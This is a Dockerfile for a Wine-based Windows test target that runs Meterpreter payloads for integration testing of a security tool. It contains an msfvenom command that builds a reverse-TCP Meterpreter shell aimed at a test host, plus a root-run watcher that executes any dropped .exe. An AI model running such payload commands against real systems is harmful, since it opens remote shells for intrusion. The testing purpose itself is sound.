# =============================================================================
# Assassinate Wine-based Windows Target Container
# =============================================================================
#
# This container runs Windows Meterpreter payloads under Wine for testing
# Windows-specific Meterpreter features like Transport Management.
#
# Features:
#   - Wine 64-bit for running Windows executables
#   - Payload watcher that executes Windows .exe payloads
#   - Network support for reverse connections
#
# Usage:
#   docker compose -f docker/docker-compose.yml build target-wine
#   docker compose -f docker/docker-compose.yml up target-wine
#
# Testing Transport Management:
#   1. Generate payload: msfvenom -p windows/x64/meterpreter/reverse_tcp ...
#   2. Copy to /payload/meterpreter.exe
#   3. Start handler on integration-test
#   4. Trigger: touch /payload/trigger
#
# =============================================================================

FROM scottyhardy/docker-wine:stable

LABEL maintainer="Assassinate Project"
LABEL description="Wine-based Windows target for Meterpreter testing"
LABEL security.warning="DO NOT expose this container to untrusted networks"

# Switch to root for setup
USER root

# Install supervisor and utilities
RUN apt-get update && apt-get install -y --no-install-recommends \
    supervisor \
    procps \
    iproute2 \
    curl \
    netcat-openbsd \
    && rm -rf /var/lib/apt/lists/*

# Create payload directory
RUN mkdir -p /payload && chmod 777 /payload

# Create Windows payload watcher script
# This watches for trigger file and executes Windows .exe payloads via Wine
RUN cat > /usr/local/bin/wine-payload-watcher.sh << 'WATCHER_EOF'
#!/bin/bash
# Wine Payload watcher - executes Windows .exe payloads under Wine
# Trigger: touch /payload/trigger
# Payload: /payload/meterpreter.exe (or any .exe in /payload/)

echo "[wine-watcher] Started, watching /payload/trigger"
echo "[wine-watcher] Wine version: $(wine --version 2>/dev/null || echo 'not ready')"

# Initialize Wine prefix (takes a few seconds first time)
export WINEPREFIX=/home/wineuser/.wine
export WINEDEBUG=-all

while true; do
    if [ -f /payload/trigger ]; then
        echo "[wine-watcher] Trigger detected!"
        rm -f /payload/trigger

        # Execute any .exe files in /payload/
        for payload in /payload/*.exe; do
            if [ -f "$payload" ]; then
                echo "[wine-watcher] Executing via Wine: $payload"
                # Run in background so we can continue watching
                nohup wine64 "$payload" > /var/log/wine-payload-$(basename "$payload").log 2>&1 &
                echo "[wine-watcher] Payload started with PID: $!"
            fi
        done
    fi
    sleep 1
done
WATCHER_EOF
RUN chmod +x /usr/local/bin/wine-payload-watcher.sh

# Create supervisor config
RUN cat > /etc/supervisor/conf.d/wine-services.conf << 'EOF'
[supervisord]
nodaemon=true
user=root
logfile=/var/log/supervisord.log
pidfile=/var/run/supervisord.pid

[program:wine-payload-watcher]
command=/usr/local/bin/wine-payload-watcher.sh
autostart=true
autorestart=true
stdout_logfile=/var/log/wine-watcher.log
stderr_logfile=/var/log/wine-watcher.err
priority=10
environment=WINEPREFIX="/home/wineuser/.wine",WINEDEBUG="-all",DISPLAY=":0"
EOF

# Create healthcheck
RUN cat > /usr/local/bin/healthcheck.sh << 'EOF'
#!/bin/bash
# Check if watcher is running
pgrep -f wine-payload-watcher > /dev/null || exit 1
exit 0
EOF
RUN chmod +x /usr/local/bin/healthcheck.sh

# Create startup script
RUN cat > /usr/local/bin/start.sh << 'EOF'
#!/bin/bash
echo "========================================"
echo "Assassinate Wine Target Container"
echo "========================================"
echo ""
echo "Services:"
echo "  - Wine payload watcher: executes /payload/*.exe on trigger"
echo ""
echo "Windows Meterpreter Testing:"
echo "  1. Generate payload:"
echo "     msfvenom -p windows/x64/meterpreter/reverse_tcp \\"
echo "       LHOST=integration-test LPORT=4433 -f exe -o /payload/meter.exe"
echo "  2. Trigger: touch /payload/trigger"
echo ""
echo "Starting services..."
exec /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
EOF
RUN chmod +x /usr/local/bin/start.sh

# No ports exposed - Windows Meterpreter uses reverse connections
EXPOSE 4445

HEALTHCHECK --interval=10s --timeout=5s --retries=3 \
    CMD /usr/local/bin/healthcheck.sh

ENTRYPOINT ["/usr/local/bin/start.sh"]
